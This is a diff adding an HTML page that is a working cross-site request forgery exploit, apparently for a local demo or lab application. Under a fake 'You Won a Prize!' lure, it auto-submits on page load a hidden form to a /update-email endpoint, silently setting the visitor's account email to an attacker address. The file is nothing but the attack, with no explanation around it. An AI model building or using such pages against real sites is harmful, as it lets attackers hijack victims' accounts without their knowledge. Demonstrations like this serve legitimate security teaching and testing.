@@ -1,0 +1,13 @@
+<html>
+    <head>
+        <title>You Won a Prize!</title>
+    </head>
+    <body onload="document.forms[0].submit()">
+        <h1>Congratulations, you won!</h1>
+        <p>Your prize is being claimed...</p>
+        
+        <form action="http://localhost:3000/update-email" method="POST" style="display:none;">
+            <input type="hidden" name="email" value="attacker@hacked.com" />
+        </form>
+    </body>
+</html>
